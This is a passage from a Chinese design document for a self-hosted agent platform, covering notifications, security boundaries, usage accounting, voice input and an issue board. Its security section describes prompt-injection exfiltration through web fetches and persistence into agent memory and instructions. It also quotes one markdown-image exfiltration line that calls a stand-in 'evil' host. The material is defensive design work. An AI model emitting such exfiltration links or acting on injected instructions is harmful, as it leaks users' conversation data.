- token 是我们签发给外部系统的凭证，事实来源是触发器自己：`state` 里只存 SHA-256，明文只在生成时返回一次，**只能由用户在界面上生成**（agent 创建的 webhook 在用户生成 token 之前收不到事件）。不放进 vault——vault 存的是外部系统发给我们的凭证。
- 不校验各平台自己的签名格式（GitHub、Slack 等各不相同）。需要时由发送方把 token 放进 Authorization 头，或在中间加一层转发。

**通知**（`notifications/`：`service.py` 是通知的读写，`delivery.py`、`webpush.py` 只管投递）：运行的回答给在等它的用户（订阅 `RunEnded`：处理过的信件有 `awaited`，且做完了或停下来问用户，用户自己停止的不推）、agent 调 `notify_user`、前置检查告警与 issue 交给用户（定向命令 `Notify`）、推送测试，都经 `Notifications` 内部的 `_enqueue_in` 在通知领域自己的事务里写一条 `notifications` 行，并给当时的每个推送订阅各排一个 deliver task（只带 `notification_id` 与订阅的 endpoint；没有订阅就只留在通知页）。DeliverHandler 投递时读出通知、订阅（排队后已退订就跳过）和当时的未读数，Web Push 的载荷带上这个数，Service Worker 收到后设置应用图标角标（Badging API，iOS 16.4+ 主屏应用）；应用在打开、回到前台、收到新通知事件（SSE `notification`，写下通知的事务提交后发出，与有没有推送订阅无关）和标记已读之后从服务端重新取未读数，刷新导航上的数字与角标。已读规则：打开通知页标记到列出的最新一条为止（之后才到的保持未读）；打开会话时只由会话领域标记（`SessionService.mark_read`），同一事务发布 `SessionRead`，通知领域订阅它把指向这个会话的通知标为已读（提交后 `run_now` 马上投递，通常请求返回时未读数已更新；同一 lane 上有更早的投递时由 worker 稍后处理，界面在 `event` 投递完成时重新取未读数）。通知随它指向的会话删除（订阅 `SessionDeleted`）；`RunEnded`、`SessionRead`、`SessionDeleted` 在同一条按会话的 lane 上；系统通知点开进通知页，所以前置检查告警在检查恢复、`precheck_error` 清除之后仍看得到。

通知只有 Web Push 一种渠道。不支持主动推送的外部消息源（例如只能拉取的 Slack 未读）用定时触发器拉取：例如每分钟让 agent 通过 Slack MCP（或 skill 中的脚本 + vault token）读取未读消息，游标由 agent 存在自己的工作目录。

## 15. 安全边界

**威胁模型：agent 与运行服务的系统用户同等可信。** agent 能执行任意 shell 命令，因此能读到服务能读到的一切——包括配置文件里的 `vault.key` 与 LLM API key、数据库文件。下面的措施只防止 secret **意外**进入对话记录、日志和前端，不防 agent 本身：

能缩小的是**提示注入的影响面**：处理外部事件或网页内容的 agent 用 `tool_groups` 只开放它需要的工具组（例如只开 `notify`），这样即使输入里带有恶意指令，它也删不了 agent、改不了公共指令和公共 skill（两者都会进入所有 agent 的 instructions）、用不了 MCP、动不了 vault 和触发器。选组时按组里的工具实际能做什么判断（`get_agent` 列出每组的工具），不另设「权限等级」标记：例如 `workspace` 有 shell，`temp_agent` 的临时 agent 自带 shell，`delegation` 与 `issues` 借目标 agent 自己的工具组之手做事，`agents` 可以给自己加组，`triggers` 可以让任意 agent 带着任意说明定时运行，`mcp_admin` 可以添加运行任意命令的 stdio MCP。`web` 本身就是不可信内容的入口（搜索结果与网页正文），也是外发通道：抓取的 URL 可以带上对话里的任何内容，发给搜索服务与目标站点。所以「只开 `notify` + `web`」看似很窄，对处理不可信输入的 agent 已经是一条完整的外泄链路，这类 agent 不应选 `web`；配置了 `[web]` 后新建 agent 默认也包括它。

注入还可能**持久化**：记忆、私有 skill 与自己的指令总是开放（不受 `tool_groups` 限制），处理不可信输入的 agent、以及读取含不可信输入的转录的反思，可能把注入的内容写进它们，之后该 agent 的每次运行都会带着它。影响限于这个 agent 自己（工具组不变，不能越权），但指令在 system prompt 里的权威性比记忆高。缓解手段是版本历史与作者记录：界面上能看到每一版是谁改的，随时回滚。

- shell 只继承少量环境变量（`PATH`、`HOME` 等）；
- `run_shell(secrets=[KEY])` 输出中的 secret 明文被替换为 `[secret:KEY]`（逐字匹配，编码后的输出不会被替换）；
- `vault_set` 的参数在持久化前脱敏；但用户在 prompt 里直接写的明文会原样保存并在之后的请求里发给模型——敏感值应在 UI 的 Vault 页录入。

如需真正隔离，应让服务以独立系统用户运行、把配置文件与数据目录放在 agent 可读范围之外并限制权限，或把 shell 放进沙箱。

其他边界：

- Web 与 API：单用户密码登录（至少 8 位），HMAC 签名 cookie（密钥至少 32 位），有效期 90 天。签名 key 由密钥与密码摘要一起派生：改密码（改配置后重启）即吊销所有已签发的 cookie，没有服务端会话表；登出只删浏览器里的 cookie。登录接口未做频率限制，部署在公网时应在反向代理层限流。
- 文件下载：与界面同源、带着登录 cookie，内容按不可信处理（agent 能写任意 HTML/SVG）。响应一律带 `X-Content-Type-Options: nosniff` 与 `Content-Security-Policy: sandbox`，只有 png/jpeg/gif/webp 按 inline 返回，其余一律 `Content-Disposition: attachment`，不在本站执行（同 Matrix 媒体下载）。
- 回答里的图片：前端只渲染指向 `/api/files/` 的图片，外链图片显示为普通链接。否则被注入的模型输出 `![](https://evil/?d=<对话内容>)`，打开会话时浏览器就会自动把数据发出去。
- Vault：Fernet 加密，主密钥来自配置 `vault.key`，缺失或格式错误时拒绝启动。
- 配置文件：唯一配置来源（`config.example.toml`），未知键直接报错，避免拼写错误被静默忽略。
- 日志不打印 secret 值与 token。

## 16. 部署形态与边界

- **单进程**：事务串行化与 task 领取依赖进程内锁，所以只跑一个进程。这不影响 agent 并发：worker 同时执行 `runtime.worker_concurrency` 个 task（不同 session、不同 agent 并行，同一 session 串行）。模型调用与工具执行都是异步 IO，不占事务锁。
- **外部消息**：能主动推送的外部系统接入 webhook 触发器；只能拉取的由定时触发器拉取（见第 14 节）。
- **上下文压缩的覆盖范围**：按上一次请求报告的 token 数在步与步之间压缩，不预估下一次请求的大小：一步里的工具结果极大、直接超出模型上限时，那次运行失败可见，在会话页点「压缩」后重试即可。不自动识别各提供方的超限错误，因为错误格式各不相同，无法可靠识别。

## 17. 前后端契约

- **接口类型只有一份**：后端的请求、响应模型与 SSE 事件模型（`api/events.py` 的 `ServerEvent`：任务状态 `platform.bus`、`saved`、运行条目与运行文字增量 `sessions.live`、新通知 `notifications.events.NotificationEvent`、心跳）就是契约。`python -m muliao.api.app` 输出与服务一致的 OpenAPI 描述，提交为 `web/openapi.json`，后端测试保证它与接口一致；前端类型 `web/src/schema.d.ts` 由 `npm run gen:api`（openapi-typescript）生成，前端测试保证它与描述一致。改了接口：重新生成两份，再改前端。
- **前端调用按描述类型化**（`api.ts` 的 `call`）：每个调用写一次路径模板（如 `/api/agents/{agent_id}`），路径参数、查询参数、请求体与成功响应的类型都从生成的 `paths` 推出；没有响应体的接口类型为 `void`。`api.ts` 只给生成的类型起名字，并在边界上把 agent id 字段换成品牌类型 `AgentId`。唯一的例外是上传（请求体是文件本身，描述里没有 JSON 请求体）。
- **SSE 用 FastAPI 自带的事件流**（`/api/events`，`EventSourceResponse`）：每条 data 按 `ServerEvent` 校验并序列化。`ServerEvent` 是具名组件，前端的事件联合直接取它（openapi-typescript 还不认识 OpenAPI 3.2 的 `itemSchema`），只加上前端自己产生的两种：`connected`（每次连上都发，第一次也发：页面的首次请求可能早于订阅建立）与 `changed`（页面自己改了某类数据，如删会话、标已读、增删改 agent，服务端不为这些发事件；分屏并排的列表据此刷新，`events.announceChange`）。数据库是唯一事实源，事件只是展示加速：前端收到任务状态变化、`saved`、连上、`changed` 时从接口重新拉取（按所展示的数据类别 `Resource` 重新拉取的页面用 `events.useRefetch`，会话页按运行事件自己合并；agent 列表是各处共用的一份缓存 `ui.useAgents`）。单个页面监听器抛错不影响其他监听器（`reportError` 报告）。
- **实时条目与历史同一个投影**（`sessions/transcript.py`）：前端把快照（会话接口的 `live`）与之后收到的事件按 `run_id`、`seq` 合并，完整条目原样接上，文字增量接在同类最后一条后面（`events.liveItems`），不自己投影。
- **结构化状态由后端给出**：`ask_user` 条目的状态见第 7 节；前端不解析工具结果文本。
- **路由**：前端会话页地址只由 `api.sessionRoute` 构造（推送通知点开的地址由后端 `notifications/webpush.py` 生成，与它一致）；webhook 地址只由 `triggers.webhook.hook_url` 构造。

## 18. 领域之间的最终一致：三条判据

| 跨领域效果 | 失败可见 | 可收敛 | 代价 |
|---|---|---|---|
| 委派结局交回发起方 | 与结清同一事务，结清失败即整个事务回滚、随运行的失败可见 | 每个关联只结清一次；停止之后的结局按占用 cleared 不投 | 无（同一事务） |
| 推送 | 投递任务失败可见、可重试；Web Push 失败语义不变 | 处理器的写入与投递完成同一事务，每次运行恰好一条通知；重试时确认会话还在 | 推送晚几百毫秒 |
| 反思调度 | 同上 | 步数从 messages 推导，检查点只由一条 lane 写，步数与区间上界取自同一快照 | 无 |
| 停止后结束后台任务、停下委派出去的 thread | 投递任务失败可见 | 结束进程与停止 thread 幂等；迟到结局不投 | 停止后进程与 thread 可能多跑几百毫秒 |
| 删除会话后的清理（通知） | 同上 | 删除幂等 | 指向已删除会话的通知短暂存在 |
| 删除 agent | 正在删除的状态可见；投递失败可见 | 每步幂等；忙的会话先停止再删除 | agent 从列表消失与目录删除之间有窗口 |
| 后台任务的发起中途失败或崩溃 | 行留在 running，可查 | 没有监督者的行只有一条收敛规则，检查前与启动时对账 | 对账前多占一行 |
| 触发器投信 | 投递任务失败可见 | 记下触发与投信恰好一次（定向命令）；马上执行，做不到由 worker 投递 | 极少数情况下会话晚几毫秒出现 |

## 19. 用量

**职责**：记下每次模型运行花掉的 token，按时间范围汇总给界面看（`usage/`，表 `model_usage`）。

- **唯一的写入方是 `agent_runtime`**（它是唯一调用模型的地方）：四个模型调用入口各对应一种运行类型——会话的运行（`run_steps`）、上下文压缩（`summarize`）、强制反思（`run_once`）、临时 agent（`run_temp`）。入口与类型一一对应，不靠参数分发。
- **怎么拿到用量**：每个入口在调用 pydantic-ai 之前建一个 `RunUsage` 并交给它，pydantic-ai 把每次请求的用量累加进这个对象，所以运行成功、失败还是被取消，收尾时拿到的都是**已经花掉的那部分**。三种运行（会话的逐步运行、反思与临时 agent、压缩）共用一个上下文管理器 `AgentRuntime._billed`：记开始日志、交出 `RunUsage`，退出时在 `finally` 里记账（`_bill`）。
- **记账不属于这次运行**：写入失败只记 error 日志，不改变运行的结果或异常——一次记账故障不该让已经做完的工作白做，也不该把一个真正的失败换成另一个。完全没有用量（还没发出请求就失败了）就跳过，不留空行。写入放在屏蔽作用域里并加时限：被取消的运行同样花了 token，取消之后也要记下来（屏蔽挡得住 anyio 的电平取消；用户停止用的原生取消是边沿触发的，对已被停止的运行来说在这之前就发出过了，见第 4 节）。剩下一个窄窗口——运行正常跑完、正在等数据库锁时用户才按停止——这一条用量随取消丢掉，不为它加防御：结局与「停止早到一瞬」相同，代价只是一条账目。
- **归属**：记到 agent 与会话名下。反思不属于任何会话，会话为空；临时 agent 自己不属于任何会话（`RunScope.session_id` 仍是 None），但它的开销是发起它的那次运行的，记到那个会话名下。
- **token 的口径**沿用 pydantic-ai 的归一化约定：`input_tokens` 是输入总数，**已经包含** `cache_read_tokens` 与 `cache_write_tokens`（Anthropic 原始响应把它们分开报，pydantic-ai 统一过），所以展示时是「总数与其中两部分」，不相加。
- **重试会重复计数，这是对的**：失败的运行重试一次就真的再花一次 token，每次尝试各记一条。
- **汇总**：`GET /api/usage?since=&until=&group_by=agent|model|day`（可多选，左闭右开；时刻必须带时区，不带的在边界上 422）。取出区间内的行后在内存里按选中的维度相加（`usage.service._summarize`，纯函数，分组规则只有这一份）；「天」按配置的 `timezone` 划分日历日，和人看日历的方式对齐。个人规模下一次取几千行可接受，换来分组规则与时区处理都只写一遍。
- **只增不改、不参与删除清理**：删掉 agent 或会话不等于这笔钱没花过，所以 `agent_id` / `session_id` 可能指向已经不存在的东西，界面上显示为 id 或「未知」。这个领域没有事件、没有任务，也不订阅别人的删除。
- **界面**：设置 → Token 用量（`web/src/pages/Usage.tsx`）：近 7 / 30 天，合计与缓存命中比例、按 agent、按模型，以及按天的输入 token 条形图（深色部分是缓存命中）。

## 20. 语音输入

**职责**：用户在界面上说话代替打字（常常中英混杂），转成文字后照常作为消息发出（`speech/`）。agent 只看到文字，消息、历史、模型请求都不知道语音的存在。

- **流程**：按住麦克风按钮说话、松手结束（移出按钮再松手是取消），界面用 `MediaRecorder` 录音（Chrome/Firefox 是 webm/ogg 的 opus，iOS/Safari 是 mp4 的 aac），停止后把原始音频 `POST /api/transcriptions`（请求体就是音频，Content-Type 是它的类型，同 `/api/files`），拿回 `{text}`。会话页拿到文字就接在输入框内容后面、连同附件一起发出（发不了或发送失败时留在输入框里）；新对话还要选 agent，文字只填进输入框。录音不落盘、不进数据库。
- **转写服务**：`muliao.speech.api.Transcriber`，具体服务由配置 `[transcription]` 的 `type` 选择。现有 `dashscope`：阿里云百炼的录音文件识别（`qwen-audio-3.0-asr-flash` 等，原生 `multimodal-generation` 接口，音频以 data URI 内联，`parameters.format` 必填），中英混杂原样输出；常说的术语可配即时热词 `vocabulary`。不用全模态对话模型（Qwen-Omni）：它要靠系统提示约束才不去回答语音内容，还会先思考，慢且不稳。新增一种服务 = 一个实现加一个 `type`。
- **错误**：不认识的音频类型、空录音 422；超过 `max_bytes` 413；服务端出错、网络不通是 502（`UpstreamFailed`，带上服务给的原因），界面显示后用户重录即可，不重试。听不到说话时返回空文字，界面提示「没有听到说话内容」。
- **开关**：没配置 `[transcription]` 时 `/api/transcriptions` 是 404，`GET /api/features` 的 `transcription` 为假，界面不显示麦克风按钮；浏览器不能录音（非 HTTPS、没有 `MediaRecorder`）时也不显示。

## 21. issue 看板

**职责**：人与 agent 协作的事项（`issues/`，表 `issues`、`issue_activities` 与 `issue_dependencies`）。界面上有看板（拖拽改状态）、列表与详情页；agent 用工具组 `issues`（`issue_list/show/create/update/comment`）读写。

- **状态**：backlog / todo / in_progress / in_review / blocked / done / cancelled。**负责项目（owner）**：一个 agent（一个 agent 负责一个项目），创建时必填，不随指派变化，只能显式修改（时间线记一条）；按它筛选（`issue_list(owner=)`、`GET /api/issues?owner=`、界面的「负责项目」）看一个项目的全部来龙去脉。负责的 agent 被删除时置空。**指派人**（单列 `assignee`）：agent id、用户（`"user"`），或未指派（NULL）——现在谁在做。界面上的操作以用户身份进行（actor 为 None），工具以调用它的 agent 身份进行。
- **时间线**：每次创建、评论、每个真正变了的字段各记一条 `IssueActivity`，只增不改；删除 issue 一起删。
- **issue 会话**：每个（issue, agent）对应唯一一个会话，归会话领域：`origin=issue`、`origin_ref` 为 issue id、agent，按 `SessionKey` 定位，没有就建（会话被删了下次就新建）。issue 领域不存会话 id；界面与 `IssueOut.sessions` 上「各 agent 的会话」由 `sessions.api.keyed_sessions_among` 派生。issue 只在它自己的会话里做：普通对话只建 issue、派 issue（没有认领、让出之类的登记）。
- **依赖**（表 `issue_dependencies`，有向无环图）：issue 可以依赖别的 issue（上游），让几件事按先后做而不是同时抢着做。创建时给出（`issue_create(depends_on=)`、`POST /api/issues`），修改时整体替换（`issue_update(depends_on=)`，`[]` 去掉全部）；上游必须存在、不能重复，成环（含依赖自己）当场拒绝并给出环上的路径（`rules.cycle_through`）。上游是 done 或 cancelled 就算完成（`rules.FINISHED`；取消也解除，由下游自己判断还做不做）；还有没完成的上游（`rules.waiting_on`，`IssueWork.waiting_on`、接口与 `issue_list` 的 `waiting_on`）时，下游还轮不到：动态照常记时间线，但不投、不算停滞，状态也不自动改。上游从未完成进入 done / cancelled 时，同一事务里给每个下游记一条 `dependency` 动态（`{"issue": 上游, "from", "to"}`）并按投递规则投递——下游因此不再等待时，这就是让它开工的那封信（摘要带上游及其状态；等待期间没投的动态由 agent 自己 `issue_show` 看）；还在等别的上游就只记时间线。上游被重新打开，下游自然回到等待，不另做处理。修改依赖记一条 `depends_on` 动态（`{"from": [...], "to": [...]}`），同样按规则投递（去掉最后一个没完成的上游即开工）；删除 issue 时边级联删除，它的下游各记一条 `depends_on` 动态并投递。
- **投递**（`issues.rules.recipient`，纯函数）：issue 上的每条动态——创建、评论、状态、指派、标题、描述、优先级、负责项目、依赖的修改，以及上游完成——都作为一封信投进收件人的 issue 会话，内容（`rules.delivery_message`）只有一行摘要（编号、标题、状态、指派人，有依赖时带上游及其状态）、这次的动态原文（评论全文）和一句「用 `issue_show` 看完整内容」，不随时间线变长；首封信也一样，描述、依赖与完整时间线由 agent 自己 `issue_show`（等上游期间记下的动态也靠它看）。处理指引是固定文本，放在 issue 会话的来源说明里（`sessions.origins` 的 ISSUE，属于缓存前缀），不在每封信里重复。收件人是动作之后被指派的 agent；动作之后处于 todo / in_progress（包括这次动作让它进入）、且不在等上游才投：backlog 是以后再做，in_review / done 等是已经交出去。被指派的 agent 在它自己这个 issue 会话里的动作不投回那里（避免自激循环）；它在别的会话（如普通对话、别的 issue 的会话、它从 issue 会话委派出去的 thread）里给自己建、派、转 todo 或评论，照常投进 issue 会话——thread 里的动作因此会回投一次，但不会循环（回投不产生新的动态）。一次修改改了几个字段就带上这几条动态，只投一封。两个 agent 互相改派不加限制。
- **投信**：在 issue 的事务里经 `receive_command_in` 得到定向命令 `Receive`（来源 `Origin.ISSUE`，目标 `SessionKey`）并 `send_in`，提交后 `run_now`；没有用户在等（awaited = False），结果记在 issue 上。
- **停滞**（`rules.stalled`，唯一规则）：todo / in_progress、不在等上游、指派给 agent，而它的 issue 会话空闲或不存在。`IssueService.work` 一次算出一批 issue 的各 agent 会话、被指派 agent 会话的工作状态（`SessionActivity.work_states_in`：running / waiting / idle）与是否停滞，`issue_list` 与接口的 `assignee_session`、`stalled` 都来自它。界面在 `stalled` 的卡片上标「没人在处理」；巡检 agent（issue-watch）的前置检查读接口的 `stalled`，评论来唤醒被指派的 agent——与界面同一条规则。
- **交给用户**：agent 把 issue 指派给用户时发 `Notify` 推送，点开是它交出 issue 的那个会话。
- **先审核再完成**：agent 做完不自己设 done，而是设 in_review 并指派给用户，由用户审核后拖进 done。这是约定，写在 issue 会话的来源说明（`sessions.origins` 的 ISSUE）和 `issue_update` 的工具说明里，代码不拦。
- **删除 agent**：订阅 `AgentDeleting`，指派给它、归它负责的 issue 改为未指派、无负责人（各记一条时间线）。它的 issue 会话随它由会话领域删除，issue 领域没有要清理的会话引用。

## 22. 暂缓的项

- **临时 agent 改为用完即删的 thread**：运行只剩一种模型，失败只重做自己。等占用与结清稳定之后再定。
- **自己写 agent loop**（框架只做模型客户端）：改动限于 `agent_runtime` 的运行端口（第 2.1 节）。
